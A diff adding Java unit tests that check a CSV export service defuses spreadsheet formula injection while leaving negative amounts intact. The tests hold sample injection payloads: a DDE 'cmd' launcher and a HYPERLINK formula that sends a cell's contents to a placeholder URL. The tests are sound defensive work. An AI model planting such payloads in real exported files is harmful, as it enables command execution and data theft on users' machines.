@@ -37,6 +37,26 @@ class ImportErrorExportServiceTest {
   }
 
   @Test
+  void aFormulaBehindAMinusSignAndADigitOrLeadingBlanksIsDefusedToo() {
+    // Classic payloads: they start like a negative amount, but are formulas.
+    assertThat(ImportErrorExportService.cell("-2+3+cmd|' /C calc'!A0", ";"))
+        .isEqualTo("'-2+3+cmd|' /C calc'!A0");
+    assertThat(ImportErrorExportService.cell("-1+HYPERLINK(\"http://x?\"&A1)", ","))
+        .isEqualTo("\"'-1+HYPERLINK(\"\"http://x?\"\"&A1)\"");
+    assertThat(ImportErrorExportService.cell("-1-1", ";")).isEqualTo("'-1-1");
+    assertThat(ImportErrorExportService.cell("  =cmd", ";")).isEqualTo("'  =cmd");
+    assertThat(ImportErrorExportService.cell(" -cmd", ";")).isEqualTo("' -cmd");
+  }
+
+  @Test
+  void aNegativeAmountWithGroupingMarksStaysAnAmount() {
+    assertThat(ImportErrorExportService.cell("-1'234.50", ";")).isEqualTo("-1'234.50");
+    assertThat(ImportErrorExportService.cell("-1.234,50", ";")).isEqualTo("-1.234,50");
+    assertThat(ImportErrorExportService.cell("-1 234,50", ";")).isEqualTo("-1 234,50");
+    assertThat(ImportErrorExportService.cell(" -85.00", ";")).isEqualTo(" -85.00");
+  }
+
+  @Test
   void aNegativeAmountStaysAnAmount() {
     assertThat(ImportErrorExportService.cell("-85.00", ";")).isEqualTo("-85.00");
     assertThat(ImportErrorExportService.cell("-.5", ";")).isEqualTo("-.5");
